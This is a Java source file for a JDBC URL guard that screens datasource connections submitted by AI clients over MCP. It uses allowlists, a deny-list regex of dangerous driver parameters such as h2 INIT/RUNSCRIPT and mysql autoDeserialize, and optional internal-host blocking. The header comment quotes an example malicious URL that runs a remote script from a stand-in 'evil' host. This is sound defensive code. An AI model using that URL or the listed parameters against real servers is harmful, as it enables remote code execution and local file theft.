package cn.crabc.core.app.mcp.support;

import cn.crabc.core.datasource.enums.ErrorStatusEnum;
import cn.crabc.core.datasource.exception.CustomException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.net.InetAddress;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 数据源连接参数守卫。
 * <p>
 * 背景：MCP 工具允许 AI 直接提交 {@code datasourceType} 与 {@code jdbcUrl}，
 * 而平台侧 {@code DefaultDataSourceDriver} 只是把 URL 原样交给连接池，
 * 由 JDBC 驱动自行推断。这意味着恶意的连接串可以在<b>服务端</b>造成：
 * <ul>
 *     <li>任意代码执行：如 {@code jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil/x.sql'}（h2 在 classpath 上）；</li>
 *     <li>反序列化 / 本地文件读取：如 mysql 驱动的 {@code autoDeserialize=true}、{@code allowLoadLocalInfile=true}；</li>
 *     <li>SSRF：把服务端当作内网端口探测器。</li>
 * </ul>
 * 因此本守卫做三件事：数据源类型白名单、JDBC 协议白名单 + 危险连接参数黑名单、
 * 可选的内网地址拦截。
 *
 * @author yuqf
 */
@Component
public class DatasourceGuard {

    private static final Logger log = LoggerFactory.getLogger(DatasourceGuard.class);

    /**
     * 平台支持的数据源类型（对齐前端 {@code DataSourceType} 与驱动层分支）。
     */
    private static final Set<String> SUPPORTED_TYPES = Set.of(
            "mysql", "mariadb", "tdsql", "tidb", "doris", "starrocks",
            "postgresql", "opengauss", "oracle", "sqlserver", "dm",
            "clickhouse", "dolphindb", "duckdb", "sybase", "hive", "db2", "oceanbase",
            "custom");

    /**
     * 默认允许的 JDBC 协议：仅"网络型"数据库引擎，不含 h2/hsqldb/derby/sqlite 等嵌入式引擎。
     */
    private static final Set<String> DEFAULT_ALLOWED_SCHEMES = Set.of(
            "mysql", "mariadb", "tdsql", "tidb", "doris", "starrocks",
            "postgresql", "opengauss", "oracle", "sqlserver", "jtds", "dm",
            "clickhouse", "dolphindb", "duckdb", "sybase", "hive", "db2", "oceanbase");

    /**
     * 危险连接参数：命中即拒绝。
     * <p>
     * 覆盖 h2 的 {@code INIT/RUNSCRIPT/TRACE_LEVEL_FILE}、mysql 的
     * {@code autoDeserialize/queryInterceptors/allowLoadLocalInfile*}、
     * duckdb 的 {@code extensions} 等已知的 RCE / 任意文件读写入口。
     */
    private static final Pattern FORBIDDEN_URL_PARAM = Pattern.compile(
            "(?i)[?&;]\\s*(init|runscript|script|extensions?|autodeserialize|queryinterceptors|"
                    + "allowloadlocalinfile|allowurlinlocalinfile|allowloadlocalinfilepath|"
                    + "trace_level_file|shutdown|allow_load_local_infile)\\s*=");

    /**
     * 内网/回环地址拦截开关（默认关闭：平台主要场景就是接入内网数据库）。
     */
    @Value("${crabc.mcp.block-internal-host:false}")
    private boolean blockInternalHost;

    /**
     * 允许的 JDBC 协议，逗号分隔；为空时使用默认白名单。
     */
    @Value("${crabc.mcp.allowed-jdbc-schemes:}")
    private String allowedSchemesConfig;

    /**
     * 校验并归一化数据源类型。
     *
     * @param datasourceType 原始类型
     * @return 归一化后的小写类型
     */
    public String requireSupportedType(String datasourceType) {
        String type = datasourceType == null ? "" : datasourceType.trim().toLowerCase(Locale.ROOT);
        if (type.isEmpty()) {
            throw new CustomException(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(), "必传参数不能为空：datasourceType");
        }
        if (!SUPPORTED_TYPES.contains(type)) {
            throw new CustomException(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(),
                    "不支持的数据源类型：" + datasourceType + "，可选 " + String.join(" / ", new java.util.TreeSet<>(SUPPORTED_TYPES)));
        }
        return type;
    }

    /**
     * 校验 JDBC URL 的协议与连接参数，返回去空格后的 URL。
     *
     * @param datasourceType 已归一化的数据源类型
     * @param jdbcUrl        待校验的连接串
     */
    public String validateJdbcUrl(String datasourceType, String jdbcUrl) {
        if (jdbcUrl == null || jdbcUrl.isBlank()) {
            throw new CustomException(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(), "必传参数不能为空：jdbcUrl");
        }
        String url = jdbcUrl.trim();

        String scheme = schemeOf(url);
        if (scheme == null) {
            throw new CustomException(ErrorStatusEnum.FORBID_OPERATE.getCode(),
                    "无法识别的 JDBC URL，必须以 jdbc:<协议>:// 开头：" + url);
        }
        if (!allowedSchemes().contains(scheme)) {
            throw new CustomException(ErrorStatusEnum.FORBID_OPERATE.getCode(),
                    "出于安全考虑，不允许通过 MCP 使用该 JDBC 协议：jdbc:" + scheme
                            + "（datasourceType=" + datasourceType + "）。"
                            + "嵌入式/文件型引擎可被用于在服务端执行任意代码或读取本地文件");
        }

        Matcher forbidden = FORBIDDEN_URL_PARAM.matcher(url);
        if (forbidden.find()) {
            throw new CustomException(ErrorStatusEnum.FORBID_OPERATE.getCode(),
                    "JDBC URL 包含被禁止的连接参数：" + forbidden.group(1)
                            + "，该参数可用于在服务端执行代码或读取本地文件");
        }

        if (blockInternalHost) {
            assertNotInternalHost(url);
        }
        return url;
    }

    /**
     * 解析 {@code jdbc:<scheme>:} 中的协议。
     */
    private String schemeOf(String url) {
        if (!url.regionMatches(true, 0, "jdbc:", 0, 5)) {
            return null;
        }
        int colon = url.indexOf(':', 5);
        if (colon < 0) {
            return null;
        }
        String scheme = url.substring(5, colon).trim().toLowerCase(Locale.ROOT);
        return scheme.isEmpty() ? null : scheme;
    }

    private Set<String> allowedSchemes() {
        if (allowedSchemesConfig == null || allowedSchemesConfig.isBlank()) {
            return DEFAULT_ALLOWED_SCHEMES;
        }
        Set<String> schemes = new LinkedHashSet<>();
        Arrays.stream(allowedSchemesConfig.split(","))
                .map(String::trim)
                .filter(item -> !item.isEmpty())
                .map(item -> item.toLowerCase(Locale.ROOT))
                .forEach(schemes::add);
        return schemes.isEmpty() ? DEFAULT_ALLOWED_SCHEMES : Set.copyOf(schemes);
    }

    /**
     * 拒绝回环/内网/链路本地地址。
     * <p>
     * 注意：这里做的是"连接时"解析，无法完全防御 DNS Rebinding，仅作为纵深防御手段。
     */
    private void assertNotInternalHost(String url) {
        String host = hostOf(url);
        if (host == null || host.isBlank()) {
            return;
        }
        try {
            InetAddress address = InetAddress.getByName(host);
            if (address.isLoopbackAddress() || address.isSiteLocalAddress()
                    || address.isLinkLocalAddress() || address.isAnyLocalAddress()
                    || address.isMulticastAddress()) {
                throw new CustomException(ErrorStatusEnum.FORBID_OPERATE.getCode(),
                        "已开启内网地址拦截（crabc.mcp.block-internal-host=true），拒绝连接：" + host);
            }
        } catch (CustomException e) {
            throw e;
        } catch (Exception e) {
            // 解析失败交由驱动层报错，避免把守卫变成可用性问题
            log.debug("内网地址校验跳过（无法解析主机）：{} - {}", host, e.getMessage());
        }
    }

    /**
     * 提取 JDBC URL 中的主机名，取不到时返回 null。
     */
    private String hostOf(String url) {
        String stripped = url.substring(5);
        // jdbc:sqlserver://host:1433;databaseName=db ；jdbc:oracle:thin:@host:1521:orcl
        int doubleSlash = stripped.indexOf("//");
        String authority;
        if (doubleSlash >= 0) {
            authority = stripped.substring(doubleSlash + 2);
        } else {
            int at = stripped.indexOf('@');
            if (at < 0) {
                return null;
            }
            authority = stripped.substring(at + 1);
        }
        int end = authority.length();
        for (int i = 0; i < authority.length(); i++) {
            char c = authority.charAt(i);
            if (c == ':' || c == '/' || c == ';' || c == '?' || c == ',' || c == '\\') {
                end = i;
                break;
            }
        }
        String host = authority.substring(0, end).trim();
        // 形如 host1,host2 的多主机写法只取第一个
        int comma = host.indexOf(',');
        if (comma > 0) {
            host = host.substring(0, comma);
        }
        return host.isEmpty() ? null : host;
    }

    /**
     * 供测试与诊断使用：当前生效的协议白名单。
     */
    public Set<String> effectiveAllowedSchemes() {
        return allowedSchemes();
    }

    /**
     * 供测试使用：解析 URL 主机名。
     */
    public String extractHost(String jdbcUrl) {
        return jdbcUrl == null ? null : hostOf(jdbcUrl.trim());
    }
}
